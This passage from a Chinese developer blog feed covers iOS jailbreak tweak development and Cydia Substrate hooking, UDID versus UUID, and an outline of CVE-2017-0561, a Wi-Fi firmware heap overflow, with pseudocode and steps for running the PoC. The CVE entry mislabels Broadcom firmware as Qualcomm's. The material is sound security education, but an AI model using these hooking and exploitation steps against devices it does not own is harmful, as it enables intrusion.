自动执行的命令</span></div><div class="line">after-install::</div><div class="line">    install.exec <span class="string">"killall -9 SpringBoard"</span></div></pre></td></tr></table></figure>
<blockquote>
<p>注意：private framework 中导入的包可能存在兼容性问题。比如 BaseBoard 这个 private framework只存在 8.0及以上版本的 SDK 里。这种情况在 ios7中无法正常运行，通过弱链接（makefile weak linking）或者 dlopen/dlsym/dlclose 系列函数调用 private framework。</p>
</blockquote>
<h3 id="control"><a href="#control" class="headerlink" title="control"></a><span id="c">control</span></h3><p>control 中的信息会显示在 Cydia 中, 且 control 文件中内容可以修改。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Package: com.iosre.iosreproject   <span class="comment">#deb 包名</span></div><div class="line">Name: iOSREProject</div><div class="line"></div><div class="line"><span class="comment"># 当前ios 版本必须 高于8.0, 且安装 CydiaSubstarte</span></div><div class="line">Depends: mobilesubstrate, firmware (&gt;=8.0)</div><div class="line"></div><div class="line">Version: 0.0.1</div><div class="line">Architecture: iphoneos-arm      <span class="comment"># 目标设备的  架构</span></div><div class="line">Description: An awesome MobileSubstrate tweak!</div><div class="line">Maintainer: xy</div><div class="line">Author: xx</div><div class="line">Section: Tweaks     <span class="comment">#模板类型</span></div></pre></td></tr></table></figure></p>
<p>更多字段在 debian 的官网。</p>
<h3 id="iOSREProject-plist"><a href="#iOSREProject-plist" class="headerlink" title="iOSREProject.plist"></a><span id="i">iOSREProject.plist</span></h3><p>此 plist 文件的作用和 app 开发时的 plist 文件作用相似， 记录配置信息 描述了 tweak 的作用范围。</p>
<p>Filter 包含 3类数组</p>
<ul>
<li>Bundles<ul>
<li>指定 tweak 起作用的APP &lt; “bundle identifier” &gt;</li>
</ul>
</li>
<li>Executables<ul>
<li>指定作用的 可执行文件 &lt;文件名&gt;</li>
</ul>
</li>
<li>Classes<ul>
<li>指定 作用的 class &lt;类名&gt;</li>
</ul>
</li>
</ul>
<blockquote>
<p>注意: 当Filter 下包含不同的 Array 时需要添加一个 “Mode : Any”, 当只有一个 Array 时不需要。</p>
</blockquote>
<p><span id="plist"></span><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    Filter = &#123;</div><div class="line">        Mode = Any;</div><div class="line">        Executables = (</div><div class="line">            callservicesd,</div><div class="line">            imagent,</div><div class="line">            mediaserverd,</div><div class="line">        );</div><div class="line">        Classes = (</div><div class="line">            NSString,</div><div class="line">            SBIconModel,</div><div class="line">        );</div><div class="line">        Bundles = (</div><div class="line">            "com.apple.springboard",</div><div class="line">            "com.apple.AddressBook",</div><div class="line">        );</div><div class="line">    &#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>校验 plist 文件格式：<br><code>plutil -lint xx/xx/iOSREProject.plist</code></p>
<p>不熟悉 xml 语法，使用 xcode 编辑.</p>
<h3 id="Tweak-xm"><a href="#Tweak-xm" class="headerlink" title="Tweak.xm"></a><span id="t">Tweak.xm</span></h3><p>Tweak.xm 后缀 <code>xm</code> 代码文件使用的编程语言。<br><code>x</code> 源文件支持 Logos 和 C语法<br><code>xm</code> 源文件支持Logos 和 C/ C++ 语法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// hook 住 SpringBoard 类里的 _menuButtonDown 函数</span></div><div class="line">%hook SpringBoard</div><div class="line">- (<span class="keyword">void</span>) _menuButtonDown:(id)down</div><div class="line">&#123;</div><div class="line">    NSLog(@<span class="string">"pressed home button"</span>);</div><div class="line">    %<span class="built_in">log</span>((NSString *)@<span class="string">"iOSRE"</span>, (NSString *)@<span class="string">"Debug"</span>);</div><div class="line">    %orig;</div><div class="line">&#125;</div><div class="line"></div><div class="line">%<span class="keyword">new</span></div><div class="line">- (<span class="keyword">void</span>)namespaceNewMethod</div><div class="line">&#123;</div><div class="line">    NSLog(@<span class="string">"add a new method to class SpringBoard"</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line">%end</div><div class="line"></div><div class="line">%hook SBLockScreenDateViewController</div><div class="line">- (<span class="keyword">void</span>)setCustomSubtitleText:(id)arg1 withColor:(id)arg2</div><div class="line">&#123;</div><div class="line">    <span class="comment">// 在锁屏界面显示 "iOS 8 App Reverse Engineering"</span></div><div class="line">    %orig(@<span class="string">"iOS 8 App Reverse Engineering"</span>,  arg2);</div><div class="line">&#125;</div><div class="line">%end</div><div class="line"></div><div class="line">%group iOS7Hook</div><div class="line">%hook iOS7Class</div><div class="line">- (id)iOS7Method</div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">&#125;</div><div class="line">%end   <span class="comment">//hook</span></div><div class="line">%end   <span class="comment">//group</span></div><div class="line"></div><div class="line">%group iOS8Hook</div><div class="line">%hook iOS8Class</div><div class="line">- (id)iOS8Method</div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">&#125;</div><div class="line">%end   <span class="comment">//hook</span></div><div class="line">%end   <span class="comment">//group</span></div><div class="line"></div><div class="line">%ctor</div><div class="line">&#123;</div><div class="line">  %init()   <span class="comment">//初始化 _ungrouped %group</span></div><div class="line">  <span class="comment">// %init(iOS7Hook)   // 初始化 iOS7Hook %group</span></div><div class="line">  <span class="comment">// %init(iOS8Hook)   // 初始化 iOS8Hook %group</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Logos 函数使用 % 开头。<br>这里用户定义了2个 group(iOS7Hook 和 iOS8Hook), 并且显示定义了 %ctor 负责初始化要使用的 group</p>
<h2 id="编译-打包-安装"><a href="#编译-打包-安装" class="headerlink" title="编译 + 打包 + 安装"></a>编译 + 打包 + 安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">make    // 没有任何文件创建</div><div class="line">make package</div><div class="line">make package install    // 提前在 Makefile 中配置目标 ip</div></pre></td></tr></table></figure>
<p>安装是通过 ssh 命令实现，要求越狱的 iOS 安装 OpenSSH, 需要在 makefile 中设置 <code>THEOS_DEVICE_IP</code>。<br>还可以配置 公钥登录， 具体步骤略。</p>
<p><img src="/include/img/ios_tweak.png" alt="锁屏界面文字替换"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面使用大量篇幅介绍开发 tweak 的流程略显啰嗦，其实 tweak 开发的本质就是 Cydia Substrate 的 hook。<br>hook 的目标进程、可执行文件、类：通过 <projectname>.plist 文件控制<br>具体的 hook 代码：定义在 xm 文件中，可以使用 Object-C/C/C++ 开发<br>hook 实现：通过 Logos 语法封装。</projectname></p>
<p><strong>更多关于 tweak 的高级玩法和 其框架的限制，还要在未来的实践中去摸索</strong></p>
<h1 id="逆向tweak"><a href="#逆向tweak" class="headerlink" title="逆向tweak"></a>逆向tweak</h1><p>将deb 包解压会有2个重要的压缩文件：</p>
<ul>
<li><code>control.tar.gz</code>  安装控制文件</li>
<li><code>data.tar.lzma</code>   二进制程序（动态库，可执行文件等）<br>最后那个后缀是压缩类型，可能是lzma, gz，xz等。</li>
</ul>
<p>解压上面的压缩包以后得到 control文件 和 data 目录。</p>
<h2 id="control-文件"><a href="#control-文件" class="headerlink" title="control 文件"></a>control 文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Package: com.iosre.iosreproject</div><div class="line">Name: iOSREProject</div><div class="line">Depends: mobilesubstrate</div><div class="line">Architecture: iphoneos-arm</div><div class="line">Description: An awesome MobileSubstrate tweak!</div><div class="line">Maintainer: xxx</div><div class="line">Author: xxx</div><div class="line">Section: Tweaks</div><div class="line">Version: 0.0.1-4+debug</div><div class="line">Installed-Size: 136</div></pre></td></tr></table></figure>
<h2 id="data-目录"><a href="#data-目录" class="headerlink" title="data 目录"></a>data 目录</h2><p>我逆向了某个 tweak 解压data.tar.gz 发现Library 下有3个文件夹，而我写的ioreproject只有MobileSubstrate一个文件夹。<br><img src="/include/img/ios/tweak_data.png" alt=""></p>
<p>后来发现 PreferenceBundles 下面是一个设置里的一个插件（我们先不关注这个）。<br>直接分析 动态库 <code>/data/Library/MobileSubstrate/DynamicLibraries/</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line">__ZL55_logos_method$_ungrouped$SpringBoard$namespaceNewMethodP11SpringBoardP13objc_selector:        // _logos_method$_ungrouped$SpringBoard$namespaceNewMethod(SpringBoard*, objc_selector*)</div><div class="line">00007d70         push       &#123;r7, lr&#125;</div><div class="line">00007d72         mov        r7, sp</div><div class="line">00007d74         sub        sp, #0x8</div><div class="line">00007d76         movw       r2, #0x2fa</div><div class="line">00007d7a         movt       r2, #0x0                                            ; 0x2fa</div><div class="line">00007d7e         add        r2, pc                                              ; @&quot;add a new method to class SpringBoard&quot;</div><div class="line">00007d80         str        r0, [sp, #0x8 + var_4]</div><div class="line">00007d82         str        r1, [sp, #0x8 + var_0]</div><div class="line">00007d84         mov        r0, r2</div><div class="line">00007d86         blx        imp___picsymbolstub4__NSLog</div><div class="line">00007d8a         add        sp, #0x8</div><div class="line">00007d8c         pop        &#123;r7, pc&#125;</div><div class="line">                        ; endp</div><div class="line"> */</div><div class="line"></div><div class="line">%new</div><div class="line">- (void)namespaceNewMethod</div><div class="line">&#123;</div><div class="line">  NSLog(@&quot;add a new method to class SpringBoard&quot;);</div><div class="line">&#125;</div><div class="line">%end</div></pre></td></tr></table></figure></p>
<p>采用标准的arm 汇编， 和android so 一样。</p>
<h1 id="Logos-语法"><a href="#Logos-语法" class="headerlink" title="Logos 语法"></a>Logos 语法</h1><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><ul>
<li><code>%log</code> 在%hook 内部使用。</li>
<li><code>%orig</code> 执行被 hook 的函数的原始代码</li>
<li><code>%group</code> 便于代码管理及按条件初始化分组。不属于某个自定义group 的 hook ， 默认归类到%group _ungrouped<br><strong>group 必须要配置 %init 使用才能生效。</strong></li>
<li><code>%init</code> 只有调用了%init(group name) 才能使对应的%group 起作用</li>
<li><code>%ctor</code> tweak 的构造函数, 完成初始化工作; 如果不定义,theos 会自动生成一个%ctor</li>
<li><code>%c</code> 动态获取一个类的定义</li>
<li><code>%new</code>  给一个现有的 class，添加新函数</li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>作用域</th>
</tr>
</thead>
<tbody>
<tr>
<td>%hook</td>
<td>%group</td>
</tr>
<tr>
<td>%log</td>
<td>%hook</td>
</tr>
<tr>
<td>%orig</td>
<td>%hook</td>
</tr>
<tr>
<td>%init</td>
<td>%hook , %ctor</td>
</tr>
<tr>
<td>%c</td>
<td>%hook , %ctor</td>
</tr>
</tbody>
</table>
<p>Logos 语言的本质是theos对cydia Substrate提供的函数的宏封装。</p>
<h1 id="Cydia-Substrate-hook-iOS"><a href="#Cydia-Substrate-hook-iOS" class="headerlink" title="Cydia Substrate hook iOS"></a>Cydia Substrate hook iOS</h1><p><a href="http://iphonedevwiki.net/index.php/Cydia_Substrate#Example_code" target="_blank" rel="external">Cydia Substrate</a>由三部分组成, 需要在越狱手机上通过 Cydia 安装。</p>
<ul>
<li>MobileHooker</li>
<li>MobileLoader</li>
<li>Safe mode</li>
</ul>
<h2 id="MobileHooker"><a href="#MobileHooker" class="headerlink" title="MobileHooker"></a>MobileHooker</h2><p>此模块专门用来实现 hook, 下面3个函数就来执行 hook操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">IMP MSHookMessage(Class class, SEL selector, IMP replacement, const char* prefix);  // prefix should be NULL.</div><div class="line"></div><div class="line">void MSHookMessageEx(Class class, SEL selector, IMP replacement, IMP *result);</div><div class="line"></div><div class="line">void MSHookFunction(void* function, void* replacement, void** p_original);</div></pre></td></tr></table></figure></p>
<p>上面三个函数都是用来 hook，主要区别在于hook 的语言。</p>
<ul>
<li>针对 C/C++ 函数, 使用 <code>MSHookFunction(...)</code>,  使用 inline hook 的原理在函数头部添加汇编指令跳转。</li>
<li>针对 Object-C 函数, 使用 <code>MSHookMessageEx(...)</code>, 使用 OC 语言特性。</li>
</ul>
<p><code>MSHookFunction(...)</code> 和 <code>MSHookMessageEx(...)</code> 使用案例， 熟悉 hook 的 api 方便逆向 (不展示 hook C++ private method 的代码)</p>
<h3 id="MSHookFunction"><a href="#MSHookFunction" class="headerlink" title="MSHookFunction(...)"></a><code>MSHookFunction(...)</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">MSHook(<span class="keyword">void</span>, CFShow, CFTypeRef obj) &#123;           <span class="comment">// our replacement of CFShow().</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Calling original CFShow(%p)..."</span>, obj);</div><div class="line">  _CFShow(obj);                                 <span class="comment">// calls the original CFShow.</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">" done.\n"</span>);</div><div class="line">&#125;</div><div class="line">...</div><div class="line"><span class="comment">// hook CFShow to our own implementation.</span></div><div class="line">MSHookFunction(CFShow, MSHake(CFShow));</div><div class="line"><span class="comment">// From now on any call to CFShow will pass through our CFShow replacement first.</span></div><div class="line">...</div><div class="line">CFShow(CFSTR(<span class="string">"test"</span>));</div></pre></td></tr></table></figure>
<h3 id="MSHookMessageEx"><a href="#MSHookMessageEx" class="headerlink" title="MSHookMessageEx(...)"></a><code>MSHookMessageEx(...)</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> IMP original_UIView_setFrame_;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">replaced_UIView_setFrame_</span><span class="params">(UIView* self, SEL _cmd, CGRect frame)</span> </span>&#123;  <span class="comment">// Note the implicit self and _cmd parameters are needed explicitly here.</span></div><div class="line">  CGRect originalFrame = self.frame;</div><div class="line">  NSLog(<span class="string">"Changing frame of %p from %@ to %@"</span>, self, NSStringFromCGRect(originalFrame), NSStringFromCGRect(frame));</div><div class="line">  original_UIView_setFrame_(self, _cmd, frame);    <span class="comment">// Remember to pass self and _cmd.</span></div><div class="line">&#125;</div><div class="line">...</div><div class="line">MSHookMessageEx([UIView <span class="keyword">class</span>], @selector(setFrame:), (IMP)replaced_UIView_setFrame_, (IMP *)&amp;original_UIView_setFrame_);</div><div class="line">...</div><div class="line">myView.frame = CGRectMake(<span class="number">0</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">100</span>);</div></pre></td></tr></table></figure>
<p>实际上 CydiaSubstarte 提供的 api 远不止上面的3个，还有很多功能的 api，比如：MSFindSymbole(..)、MSGetImageByName(…)等等，在<a href="http://www.cydiasubstrate.com/api/c/" target="_blank" rel="external">官方文档</a>中均有介绍。</p>
<p>这三个都是用来进行hook操作的,也就是我们在非越狱开发中常说的swizzle! cydia Substrate还提供了MobileLoader：“钩子”需要在运行时被加载，靠的就是MobileLoader的功劳。MobileLoader会在适当的时机加载<code>/Library/MobileSubstrate/DynamicLibraries/</code>目录下的动态库（.dylib，这是tweak的最终产品）</p>
<h2 id="MobileLoader"><a href="#MobileLoader" class="headerlink" title="MobileLoader"></a>MobileLoader</h2><p>此模块用来加载手机中的 tweak，这些 tweak 最终是以 dylib 库的形式保存在<code>/Library/MobileSubstrate/DynamicLibraries/</code>目录下。</p>
<p>需要注意的是 MobileLoader 的作用范围并不是全局 hook。 还记得我们在上面介绍的 <a href="#plist">plist 文件吗</a>，其中只定义了Filter 过滤器，用来过滤要 hook 的目标进程、目标可执行文件、以及目标类。<br>那么 MobileLoader 就会根据 plist 中过滤器指定的作用范围，有选择的在不同进程里通过 dlopen 加载对应的 dylib。</p>
<p><strong>注意</strong>：从 ios9 开始必须定义 plist 文件。没有相应的plist的Dylib将不被加载。 要复制以前没有过滤器plist的效果，导致将dylib加载到所有进程中，请将Filter设置为com.apple.Security。</p>
<p><img src="/include/img/loader.png" alt=""></p>
<h2 id="Safe-mode"><a href="#Safe-mode" class="headerlink" title="Safe mode"></a>Safe mode</h2><p>为了防止编写的 tweak 不规范导致整个进程崩溃，所以 添加了 Safe Mode，它可以捕获 一下6种信号，然后进入安全模式。</p>
<ul>
<li>SIGABRT</li>
<li>SIGILL</li>
<li>SIGBUS</li>
<li>SIGSEGV</li>
<li>SIGSYS</li>
</ul>
<h1 id="其他技术"><a href="#其他技术" class="headerlink" title="其他技术"></a>其他技术</h1><h2 id="检查是否加壳"><a href="#检查是否加壳" class="headerlink" title="检查是否加壳"></a>检查是否加壳</h2><p><code>otool -l WeChat.app/WeChat | grep -B 2 crypt</code></p>
<p>1代表加密了，0代表被解密了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">         cmd LC_ENCRYPTION_INFO</div><div class="line">      cmdsize 20</div><div class="line">     cryptoff 16384</div><div class="line">    cryptsize 16384</div><div class="line">      cryptid 0</div><div class="line">--</div><div class="line">          cmd LC_ENCRYPTION_INFO_64</div><div class="line">      cmdsize 24</div><div class="line">     cryptoff 16384</div><div class="line">    cryptsize 16384</div><div class="line">      cryptid 0</div></pre></td></tr></table></figure></p>
<h1 id="Bugs"><a href="#Bugs" class="headerlink" title="Bugs"></a>Bugs</h1><h2 id="lzma"><a href="#lzma" class="headerlink" title="lzma"></a>lzma</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;dpkg-deb: error: obsolete compression type &apos;lzma&apos;; use xz instead&apos;</div></pre></td></tr></table></figure>
<p><a href="http://bbs.iosre.com/t/daemon/5847" target="_blank" rel="external">解决方案</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">修改opt/theos/makefiles/package/deb.mk</div><div class="line">第六行：THEOSPLATFORM_DPKG_DEB_COMPRESSION ?= lzma</div><div class="line">把最后lzma 改成 xz 就可以了</div></pre></td></tr></table></figure></p>
<h2 id="dpkg-降级"><a href="#dpkg-降级" class="headerlink" title="dpkg 降级"></a>dpkg 降级</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dpkg: error processing archive /tmp/_theos_install.deb (--install):</div><div class="line"> subprocess dpkg-deb --fsys-tarfile returned error exit status 2</div><div class="line">Errors were encountered while processing:</div><div class="line"> /tmp/_theos_install.deb</div><div class="line">make: *** [internal-install] Error 1</div></pre></td></tr></table></figure>
<p><a href="http://bbs.iosre.com/t/theos-make-install/6706" target="_blank" rel="external">解决方案</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">brew remove dpkg</div><div class="line">HOMEBREW_NO_AUTO_UPDATE=1 brew install https://raw.githubusercontent.com/Homebrew/homebrew-core/7a4dabfc1a2acd9f01a1670fde4f0094c4fb6ffa/Formula/dpkg.rb</div><div class="line">brew pin dpkg</div></pre></td></tr></table></figure></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="ios" scheme="http://yoursite.com/tags/ios/"/>
    
      <category term="tweak" scheme="http://yoursite.com/tags/tweak/"/>
    
  </entry>
  
  <entry>
    <title>iOS开发中的UDID和UUID</title>
    <link href="http://yoursite.com/2017/04/28/%E5%BC%80%E5%8F%91/iOS%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84UDID%E5%92%8CUUID/"/>
    <id>http://yoursite.com/2017/04/28/开发/iOS开发中的UDID和UUID/</id>
    <published>2017-04-28T02:34:24.000Z</published>
    <updated>2017-05-20T04:37:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>转载自： <a href="http://blog.csdn.net/chenyufeng1991/article/details/51531491" target="_blank" rel="external">http://blog.csdn.net/chenyufeng1991/article/details/51531491</a></p>
<hr>
<a id="more"></a>
<h1 id="UDID-Unique-Device-Identifier-设备唯一标识符"><a href="#UDID-Unique-Device-Identifier-设备唯一标识符" class="headerlink" title="UDID (Unique Device Identifier :设备唯一标识符)"></a>UDID (Unique Device Identifier :设备唯一标识符)</h1><p>自从iOS5之后，苹果就禁止了通过代码访问UDID。</p>
<p>iOS 5之前，获取 UDID<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[[UIDevice current] uniqueIdenfier]</div></pre></td></tr></table></figure></p>
<p>iOS 5之后，使用identifierForVendor 代替 UDID<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NSUUID *uuid = [UIDevice currentDevice].identifierForVendor;</div><div class="line">NSLog(@&quot;uuid 1 = %@&quot;,uuid.UUIDString);</div></pre></td></tr></table></figure></p>
<p>这个identifierForVendor是一种应用加设备绑定产生的标识符，相当于是：Z(identifierForVendor) = X(某应用) + Y(某设备)。但是无论A应用在同一台手机上安装卸载多少次， identifierForVendor 的值都不变。</p>
<h2 id="禁止使用-UDID-是处于保护用户隐私的目的。"><a href="#禁止使用-UDID-是处于保护用户隐私的目的。" class="headerlink" title="禁止使用 UDID 是处于保护用户隐私的目的。"></a>禁止使用 UDID 是处于<a href="http://www.evolife.cn/html/2010/56245.html" target="_blank" rel="external">保护用户隐私</a>的目的。</h2><blockquote>
<p>在很早之前，苹果宣称如果第三方应用开发者继续分享或者使用iPhone、Mac、AppleWatch的UDID的话，那么他们的应用将会禁止上架。为什么苹果要在应用中禁止使用呢？那是因为隐私问题。比如我开发了5款App，很多用户都下载了这5款App并使用。如果我能轻易的获取这些用户的UDID，其实我能拼凑出用户的很多信息。由于UDID本身的隐私属性，之前常常用来做第三方统计和其他的目的。当然现在也有人使用MAC地址来识别设备，因为MAC地址也唯一的识别了一台设备并且不会被修改，不知道以后苹果会对此如何操作。</p>
</blockquote>
<h1 id="UUID-Universally-Unique-Identifier-通用唯一标识符"><a href="#UUID-Universally-Unique-Identifier-通用唯一标识符" class="headerlink" title="UUID (Universally Unique Identifier :通用唯一标识符)"></a>UUID (Universally Unique Identifier :通用唯一标识符)</h1><p>代码获取 UUID<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">for (int i=0; i &lt; 10; i++)</div><div class="line">&#123;</div><div class="line">    NSString *uuid = [NSUUID UUID].UUIDString;</div><div class="line">    NSLog(@&quot;uuid 2 = %@&quot;, uuid);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>通过运行程序可以发现，循环10次，每一次打印的值都是不一样的，当然循环的再多，这个值永远不会出现两个一样的值。所以从某种程序上来说，UUID跟你的设备没有什么关系了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转载自： &lt;a href=&quot;http://blog.csdn.net/chenyufeng1991/article/details/51531491&quot;&gt;http://blog.csdn.net/chenyufeng1991/article/details/51531491&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2017-0561高通wifi-soc的RCE攻击案例</title>
    <link href="http://yoursite.com/2017/04/27/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2017-0561-%E9%AB%98%E9%80%9Awifi-soc%E7%9A%84RCE%E6%94%BB%E5%87%BB%E6%A1%88%E4%BE%8B/"/>
    <id>http://yoursite.com/2017/04/27/漏洞利用/CVE-2017-0561-高通wifi-soc的RCE攻击案例/</id>
    <published>2017-04-27T02:40:57.000Z</published>
    <updated>2017-04-28T02:48:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>Title: <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1046" target="_blank" rel="external">CVE-2017-0561 issues</a></p>
<p>Core Skill：远程攻击 wpa_supplicant wifi 模块, 存在堆溢出漏洞,精心构造数据可以远程提权。</p>
<a id="more"></a>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>漏洞在高通的 BCM 固件中。当网络中有设备发送 wifi TDLS teardow请求时，网络中的设备会自动接受请求包，然后校验teardown 请求包。</p>
<p>MIG ：message integrity code  消息完整性代码<br>首先要建立 TDLS 连接，当其中一台设备发送 teardown 请求时，另一方会自动接收</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>校验完成以后，在处理请求包之前会校验MIC，调用wlc_tdls_cal_teardown_mic_chk函数。<br>伪代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">void *wlc_tdls_cal_teardown_mic_chk() &#123;</div><div class="line">uint8_t* buffer = malloc(256);</div><div class="line">...</div><div class="line">uint8_t* linkid_ie = bcm_parse_tlvs(..., 101);</div><div class="line">memcpy(buffer, linkid_ie, 0x14);</div><div class="line">...</div><div class="line">uint8_t* ft_ie = bcm_parse_tlvs(..., 55);       // 提取Fast Transition IE （55）信息元素</div><div class="line">memcpy(buf + 0x18, ft_ie, ft_ie[1] + 2);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>因为在拷贝 FTIE 之前没有校验数据报中 FTIE 的长度，所以在 memcpy 时会导致堆溢出。</p>
<h1 id="POC-使用步骤："><a href="#POC-使用步骤：" class="headerlink" title="POC 使用步骤："></a>POC 使用步骤：</h1><ol>
<li>需要下载  wpa_supplicant 2.6</li>
<li>安装补丁文件？》？》？</li>
<li>编译 wpa_supplicant （支持 TDLS）</li>
<li>使用 wpa_supplicant 链接到网路 </li>
<li>链接 到 wpa_cli:    要攻击的设备？？<pre><code>1. 使用 &quot;TDLS_SETUP   &lt;MAC_ADDRESS_OF_PEER&gt;”设置到BCM对等体的TDLS连接
2. 使用“TDLS_TEARDOWN &lt;MAC_ADDRESS_OF_PEER&gt;”拆除连接
</code></pre>(其中MAC_ADDRESS_OF_PEER是具有与同一网络相关联的BCM SoC的对等体的MAC地址）</li>
</ol>
